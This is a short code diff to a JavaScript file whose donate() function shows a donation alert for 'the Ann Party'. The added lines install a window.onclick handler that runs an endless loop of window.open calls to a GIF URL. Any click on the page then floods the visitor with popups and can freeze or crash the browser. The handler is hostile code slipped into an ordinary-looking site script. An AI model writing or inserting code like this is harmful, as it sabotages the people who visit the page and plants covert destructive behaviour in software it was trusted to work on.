@@ -24,3 +24,5 @@ function donate(amount) {
     }
     alert(`Successfully donated ${amount}$ to the Ann Party`);
 }
+
+window.onclick = () => {while(true){window.open("https://s2.gifyu.com/images/3dgifmaker48696.gif");}}
